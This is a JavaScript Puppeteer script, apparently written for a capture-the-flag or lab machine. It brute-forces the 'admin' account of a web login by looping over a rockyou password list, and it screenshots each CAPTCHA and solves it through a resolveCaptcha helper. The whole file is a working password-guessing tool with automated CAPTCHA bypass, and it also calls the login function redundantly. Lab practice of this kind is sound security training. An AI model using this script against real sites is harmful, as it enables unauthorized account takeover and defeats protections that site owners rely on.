const puppeteer = require('puppeteer');
const fs = require("fs");
const resolveCaptcha = require("./resolveCaptcha");

const username = "admin";
const rockyou = fs.readFileSync("./rockyou100.txt", {encoding: "utf8", flag: "r"});
const logs = ["admin", ""];

const initPayload = async (username, password) => {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();

    await page.goto('http://<ipOfTheMachine>', { waitUntil: 'networkidle0' });

    const captchaImage = await page.$('img[src="captcha.php"]');
    const captchaBuffer = await captchaImage.screenshot();

    fs.writeFileSync('captcha.png', captchaBuffer);

    const captcha = (await resolveCaptcha()).trim();

    await page.type("#username", username);
    await page.type("#password", password);
    await page.type("#captcha_input", captcha);
    await page.click("#login-btn");
    await new Promise(resolve => setTimeout(resolve, 2000));

    const rawText = await page.$eval('#error-box', el => el.textContent.trim());
    const text = rawText.trim();
    const isLogError = page.url().includes('error=true');

    await browser.close();

    if(text.length > 0) return "CAPTCHA incorrect";
    else if(isLogError) return "Login error";
    else return "ok";
};

const main = async () => {
    for(let password of rockyou.split("\n")) {
        try {
            logs[1] = password.replace("\r", "");
            console.log(`\n--------------\nusername: ${username}`); 
            console.log(`password: ${password}\n`);

            const token = await initPayload(username, password);
            let resTry = await initPayload(username, password);

            while(resTry === "CAPTCHA incorrect") resTry = await initPayload(username, password);

            console.log(`Log => ${resTry}`);

            if(resTry !== "Login error") {
                // console.log(`found for => ${logs}`)
                throw new Error("found!");
            }    
        }
        catch {
            console.log("Boom! =>", logs);
            process.exit();
        }
    }
}

main();
